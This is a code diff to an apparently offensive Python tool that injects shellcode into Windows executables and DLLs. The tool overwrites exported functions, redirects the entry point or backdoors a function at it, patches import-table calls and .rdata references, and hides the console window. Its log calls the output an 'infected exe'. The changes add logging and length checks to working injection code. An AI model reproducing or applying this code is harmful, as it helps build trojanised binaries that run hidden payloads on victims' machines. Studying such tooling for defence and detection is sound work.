@@ -45,15 +45,19 @@ def inject_exe(
     # Patch IAT if necessary
     if source_style == FunctionInvokeStyle.iat_reuse:
         for iatRequest in carrier.get_all_iat_requests():
+            # skip available
+            addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
+            if addr != None:
+                logger.info("   IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
+                continue
             iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
             superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
-
         superpe.pe.parse_data_directories()
 
     shellcode_offset: int = 0  # file offset
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
         # Special case: DLL exported function direct overwrite
-        logger.info("--[ Overwrite DLL function {} with shellcode".format(settings.dllfunc))
+        logger.info("---[ Inject DLL: Overwrite exported function {} with shellcode".format(settings.dllfunc))
         rva = superpe.getExportEntryPoint(settings.dllfunc)
 
         # Size and sanity checks
@@ -65,7 +69,7 @@ def inject_exe(
 
         # Inject
         shellcode_offset = superpe.get_offset_from_rva(rva)
-        logger.info(f'---[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
+        logger.info(f'----[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
         superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
     else:  # Put it somewhere in the code section, and rewire the flow
@@ -81,58 +85,58 @@ def inject_exe(
         shellcode_offset += sect.PointerToRawData
         shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)
 
-        logger.info("--( Inject: Shellcode rva:0x{:X} (from offset:0x{:X})".format(
-            shellcode_rva, shellcode_offset))
+        logger.info("---( Inject: Write Shellcode to offset:0x{:X} (rva:0x{:X})".format(
+            shellcode_offset, shellcode_rva))
 
         # Copy the shellcode
         superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
         # rewire flow
         if superpe.is_dll() and settings.dllfunc != "":
-            logger.info("---( Rewire: DLL function: {} ".format(settings.dllfunc))
-
             if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-                # Handled above, without arriving here
+                # Handled above
                 raise Exception("We should not land here")
 
             elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                 addr = superpe.getExportEntryPoint(settings.dllfunc)
-                logger.info("--( Inject DLL: Patch {} (0x{:X})".format(
+                logger.info("---( Inject DLL: Backdoor {} (0x{:X})".format(
                     settings.dllfunc, addr))
                 function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
         else: # EXE
-            logger.info("---( Rewire: EXE")
-
             if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-                logger.info("--( Inject EXE: Change Entry Point to 0x{:X}".format(
+                logger.info("---( Inject EXE: Change Entry Point to 0x{:X}".format(
                     shellcode_rva))
                 superpe.set_entrypoint(shellcode_rva)
 
             elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                 addr = superpe.get_entrypoint()
-                logger.info("--( Inject EXE: Patch from entrypoint (0x{:X})".format(
+                logger.info("---( Inject EXE: Backdoor function at entrypoint (0x{:X})".format(
                     addr))
                 function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
         if source_style == FunctionInvokeStyle.iat_reuse:
+            logger.info("--( Fix shellcode to re-use IAT entries")
             injected_fix_iat(superpe, carrier)
-            injected_fix_data(superpe, carrier)
+        logger.info("--( Fix shellcode to reference data stored in .rdata")
+        injected_fix_data(superpe, carrier)
 
     # changes from console to UI (no console window) if necessary
     superpe.patch_subsystem()
 
     # We done
+    logger.info("--( Write to file: {}".format(exe_out))
     superpe.write_pe_to_file(exe_out)
 
     # verify and log
     #shellcode = file_readall_binary(shellcode_in)
     #shellcode_len = len(shellcode)
     #code = extract_code_from_exe_file(exe_out)
-    #in_code = code[function_backdoorer.shellcodeOffsetRel:function_backdoorer.shellcodeOffsetRel+shellcode_len]
+    code = file_readall_binary(exe_out)
+    in_code = code[shellcode_offset:shellcode_offset+shellcode_len]
     #jmp_code = code[function_backdoorer.backdoorOffsetRel:function_backdoorer.backdoorOffsetRel+12]
     #if config.debug:
-    #    observer.add_code_file("exe_extracted_loader", in_code)
+    observer.add_code_file("exe_extracted_carrier", in_code)
     #    observer.add_code_file("exe_extracted_jmp", jmp_code)
 
 
@@ -150,10 +154,12 @@ def injected_fix_iat(superpe: SuperPe, carrier: Carrier):
             raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
         
         instruction_virtual_address = offset_from_code + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
-        logger.info("    Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X}".format(
+        logger.info("      Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X}".format(
             iatRequest.placeholder.hex(), instruction_virtual_address, destination_virtual_address
         ))
         jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
+        if len(jmp) != len(iatRequest.placeholder):
+            raise Exception("IatResolve: Call to IAT has different length than placeholder, abort")
         code = code.replace(iatRequest.placeholder, jmp)
 
     superpe.write_code_section_data(code)
@@ -185,40 +191,53 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier):
         rm.add_range(peSection.virt_addr, peSection.virt_addr + string_off)
 
     # Do all .rdata patches
+    logger.info("---( Patch: .rdata")
     for datareuse_fixup in reusedata_fixups:
+        logger.info("     Handling DataReuse Fixup: {} <- {}".format(
+            datareuse_fixup.string_ref, datareuse_fixup.randbytes.hex()))
+
         # get a hole in the .rdata section to put our data
-        hole = rm.find_hole(len(datareuse_fixup.data))
-        if hole == None:
+        hole_rva = rm.find_hole(len(datareuse_fixup.data))
+        if hole_rva == None:
             raise Exception("No suitable hole with size {} found in .rdata section, abort".format(
                 len(datareuse_fixup.data)
             ))
-        fixup_offset_rdata = hole[0]  # the start address of the hole (from start of .rdata)
-        rm.add_range(hole[0], hole[1])  # mark it as used
+        rm.add_range(hole_rva[0], hole_rva[1]+1)  # mark it as used
+
         var_data = datareuse_fixup.data
-        superpe.pe.set_bytes_at_offset(fixup_offset_rdata, var_data)
-        datareuse_fixup.addr = fixup_offset_rdata + peSection.virt_addr + carrier.superpe.get_image_base() - peSection.raw_addr
-        logging.info("    Add data to .rdata at 0x{:X} (off: {}): {}".format(
-            datareuse_fixup.addr, fixup_offset_rdata, var_data.decode('utf-16le')))
-        fixup_offset_rdata += len(var_data) + 8
+        data_rva = hole_rva[0]
+        superpe.pe.set_bytes_at_rva(data_rva, var_data)
+        datareuse_fixup.addr = data_rva + carrier.superpe.get_image_base()
+        if len(var_data) <= 32:  # show strings (hope they are less than that, and shellcode is larger)
+            logging.info("       Add to .rdata at 0x{:X} ({}): {}: {}".format(
+                datareuse_fixup.addr, data_rva, datareuse_fixup.string_ref, var_data.decode("utf-16le")))
+        else:
+            logging.info("       Add to .rdata at 0x{:X} ({}): {}: Data with len {}".format(
+                datareuse_fixup.addr, data_rva, datareuse_fixup.string_ref, len(var_data)))
 
     # patch code section
     # replace the placeholder with a LEA instruction to the data we written above
+    logger.info("---( Patch: .text")
     code = superpe.get_code_section_data()
     for datareuse_fixup in reusedata_fixups:
         if not datareuse_fixup.randbytes in code:
-            raise Exception("DataReuse: ID {} not found, abort".format(
-                datareuse_fixup.randbytes))
+            raise Exception("fix data in injectable: DataReuse: ID {} ({}) not found in code section, abort".format(
+                datareuse_fixup.randbytes.hex(), datareuse_fixup.string_ref))
         
         offset_from_datasection = code.index(datareuse_fixup.randbytes)
         instruction_virtual_address = offset_from_datasection + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
         destination_virtual_address = datareuse_fixup.addr
-        logger.info("    Replace {} at VA 0x{:X} with LEA {} .rdata 0x{:X}".format(
+        logger.info("       Replace bytes {} at VA 0x{:X} with: LEA {} .rdata 0x{:X}".format(
             datareuse_fixup.randbytes.hex(), instruction_virtual_address, datareuse_fixup.register, destination_virtual_address
         ))
         lea = assemble_lea(
             instruction_virtual_address, destination_virtual_address, datareuse_fixup.register
         )
+        asm_disasm(lea, instruction_virtual_address)  # DEBUG
+        if len(lea) != len(datareuse_fixup.randbytes):
+            raise Exception("IatResolve: Call to IAT has different length than placeholder, abort")
         code = code.replace(datareuse_fixup.randbytes, lea)
+
     superpe.write_code_section_data(code)
 
 
@@ -237,4 +256,5 @@ def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
     else:
         logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
         return 1
+
 
